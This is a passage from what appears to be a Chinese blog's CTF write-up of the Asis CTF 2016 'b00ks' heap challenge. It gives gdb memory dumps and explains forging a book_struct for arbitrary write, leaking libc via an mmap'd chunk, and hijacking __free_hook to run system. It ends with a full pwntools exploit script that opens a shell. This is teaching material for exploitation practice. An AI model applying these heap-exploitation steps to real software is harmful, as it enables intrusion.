+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x55a36a56a040</span><br><span class="line">0x55a36a56a040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a36a56a050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a36a56a060:	0x000055a36b2bc100	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>可以看到此时的book_struct指针已经被修改了，我们再来看一下<code>0x000055a36b2bc100</code>这个地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x000055a36b2bc100</span><br><span class="line">0x55a36b2bc100:	0x0000000000000001	0x0000000000000001</span><br><span class="line">0x55a36b2bc110:	0x000055a36b2bb000	0x0000000000000040</span><br></pre></td></tr></table></figure>
+
+<p>我们在这个地址中构造了这样的book_struct，那么此时我们再执行<code>edit(1,&#39;ccccccc&#39;)</code>，那么实际上就会往<code>(*(*(off_202010 + i) + 16LL) == *(0x000055a36b2bc100 + 16) == 0x000055a36b2bb000</code> 这个地址中写值了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/gx 0x000055a36b2bb000</span><br><span class="line">0x55a36b2bb000:	0x0063636363636363</span><br></pre></td></tr></table></figure>
+
+<p>到这里为止任意地址写的详细思路及过程就讲完了，这也就是本题唯一的难点。</p>
+<p>我们要任意地址写的话当然是去劫持hook指针，因为FULL RELOR的缘故。那么我们当然还需要泄漏libc。</p>
+<p>这里有一个点是：用mmap申请的段跟libc之间的偏移是固定的，所以我们申请一个极大的chunk使得其放在mmap段，再泄露出其地址，减去一个固定的偏移即可得到libc基址。</p>
+<p>那么我们该怎么泄漏出book2的地址呢？</p>
+<p>这个其实也很简单，因为程序中有打印book相关信息的功能，其所依赖的同样是book_struct结构，而我们前面已经讲了如何伪造一个book_struct，在我们有了heap_base之后，book2的content指针的地址我们同样知道，那么我们只需要将伪造的book_struct的name指针改成book2的content指针的地址就可以利用打印功能泄漏book2_content的地址了，这样我们就得到了libc_base。</p>
+<p>最后结合前面讲的任意地址写的方法就可以劫持hook指针了</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.buuoj.cn&quot;,28612)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size1,name,size2,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recv(timeout = <span class="number">0.25</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size1))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(size2))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of leak heap_base</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Enter author name:&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;book1&#x27;</span>,<span class="number">0xf0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">32</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1150</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base = &quot;</span>,<span class="built_in">hex</span>(heap_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of fake book_struct</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">0x16</span> + p64(<span class="number">1</span>) + p64(heap_base + <span class="number">0x11c0</span>) + p64(heap_base + <span class="number">0x1100</span> + <span class="number">16</span>) + p64(<span class="number">0x40</span>))</span><br><span class="line">name(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of leak libc_base</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>,<span class="number">0x21000</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name: &quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">5963792</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base = &quot;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line">free_hook = libc_base + (<span class="number">0x7f1e8f8f77a8</span> - <span class="number">0x00007f1e8f531000</span>)</span><br><span class="line">system = libc_base + (<span class="number">0x7fdb7950c3a0</span> - <span class="number">0x00007fdb794c7000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of hijack __free_hook</span></span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook) + p64(<span class="number">0x8</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/%E5%A0%86/" rel="tag"># 堆</a>
+              <a href="/tags/off-by-one/" rel="tag"># off_by_one</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/" rel="prev" title="堆利用-fastbin">
+      <i class="fa fa-chevron-left"></i> 堆利用-fastbin
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E8%BF%B0off-by-one"><span class="nav-number">1.</span> <span class="nav-text">简述off_by_one</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Asis-CTF-2016-b00ks"><span class="nav-number"></span> <span class="nav-text">Asis CTF 2016 b00ks</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="nav-number">0.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">0.2.</span> <span class="nav-text">思路</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">28</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
